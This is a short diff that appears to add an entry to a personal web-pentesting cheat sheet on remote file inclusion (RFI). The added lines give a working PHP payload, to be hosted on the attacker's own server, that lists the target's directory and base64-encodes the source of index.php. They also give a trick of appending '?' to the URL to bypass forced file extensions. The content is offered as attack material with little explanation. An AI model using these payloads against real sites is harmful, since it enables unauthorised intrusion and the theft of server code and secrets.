@@ -32,3 +32,8 @@ echo -n bl4h== | base64 -d
 convert to prevent that the php interpreter convert it again in a dynamic webpage
 #####################################################################################################
 
+If RFI is possible, this command in index.php of own server will print the content
+<?phpprint_R(scandir('.'));print(base64_encode(file_get_contents('index.php')));?>
+? at end of URL will break forced extentions ( degrade to GET-Parameters)
+
+#####################################################################################################
